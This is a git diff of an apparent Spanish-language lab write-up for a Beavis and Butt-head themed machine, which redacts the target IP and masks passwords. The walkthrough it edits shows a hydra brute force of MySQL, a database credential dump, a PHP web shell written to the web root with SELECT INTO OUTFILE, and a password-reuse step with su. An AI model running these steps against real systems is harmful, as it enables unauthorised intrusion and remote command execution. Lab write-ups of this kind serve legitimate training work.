@@ -3,11 +3,11 @@
 
 ```bash
 arp-scan -I eth0 --localnet
-192.168.200.27
+(IP-victima)
 ```
 
 ```bash
-nmap -p 22,80,3306 -sS -sC -sV -n -Pn 192.168.200.27 -oN nmap
+nmap -p 22,80,3306 -sS -sC -sV -n -Pn (IP-victima) -oN nmap
 ```
 - 22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
 - 80/tcp   open  http    Apache httpd 2.4.56 ((Debian))
@@ -21,14 +21,14 @@ index.php
 Luego de intentar por muchas vías, por lógica asumimos que tenemos dos posibles usuarios "beavis" y "butt-head" dado que al ingresar al puerto 80 tenemos una imagen de ellos dos y tenemos un puerto de MySQL al cual se le puede hacer fuerza bruta.
 
 ```bash
-hydra -l beavis -P /usr/share/wordlists/rockyou.txt mysql://192.168.200.27
+hydra -l beavis -P /usr/share/wordlists/rockyou.txt mysql://(IP-victima)
 ```
-- [3306][mysql] host: 192.168.200.27   login: beavis   password: rocknroll
+- [3306][mysql] host: (IP-victima)   login: beavis   password: r*******ll
 
 Ahora a ingresar vía MySQL:
 ```bash
-mysql -h 192.168.200.27 -u beavis -p
-Enter password: rocknroll
+mysql -h (IP-victima) -u beavis -p
+Enter password: r*********l
 ```
 ```sql
 show databases;
@@ -36,8 +36,8 @@ use friends;
 show tables;
 select * from users;
 ```
-- User: beavis   pass: b3@v1$123
-- User: butthead pass: BuTTh3@D!
+- User: beavis   pass: b*******3
+- User: butthead pass: B********!
 
 Bien, luego de intentar ingresar sin éxito vía SSH ya que está bloqueado, damos con la información de que vía MySQL podemos leer archivos, así que apuntamos al archivo "index.php" con éxito.
 
@@ -58,7 +58,7 @@ SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE "/var/www/html/M3t4LL1c@/we
 Ahora sí, podemos ejecutar comandos dentro de la nueva ruta.
 
 ```bash
-http://192.168.200.27/M3t4LL1c@/webshell.php?cmd=whoami
+http://(IP-victima)/M3t4LL1c@/webshell.php?cmd=whoami
 www-data
 ```
 
@@ -102,7 +102,7 @@ beavis
 Luego de varios intentos, recordamos que tenemos la contraseña de Butthead, por lo tanto intentaremos por esa vía.
 ```bash
 su butthead
-pass: BuTTh3@D!
+pass: B******!
 ```
 ```bash
 whoami
